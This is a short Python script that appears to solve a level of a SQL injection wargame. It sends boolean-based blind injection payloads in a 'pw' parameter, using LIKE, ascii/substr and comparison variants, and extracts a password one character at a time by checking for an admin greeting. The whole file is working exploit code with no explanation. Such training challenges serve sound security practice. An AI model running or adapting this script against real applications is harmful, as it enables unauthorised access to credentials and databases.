import requests
URL = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?"
cookie = {
    "PHPSESSID":"pm8noisi6il72p88g3vg7edh85"
    }
session1=requests.Session()
index = []
for i in range(8):
    for j in range(48,127):
        #data="pw=1'or(1=1)and(ascii(substr(pw,"+str(i+1)+",1))='"+str(j)+"')--'"
        #data="pw=1'or(1=1)and (pw<'"+''.join(index)+chr(j)+"')--'"
        data="pw=1'or(1=1)and (pw like '"+''.join(index)+chr(j)+"%')--'"
        print (URL+data)
        req1=session1.get(URL+data,cookies=cookie)
        if (req1.text.find("Hello admin")>0) :
            index.append(chr(j))
            print (''.join(index))
            break
print (''.join(index))
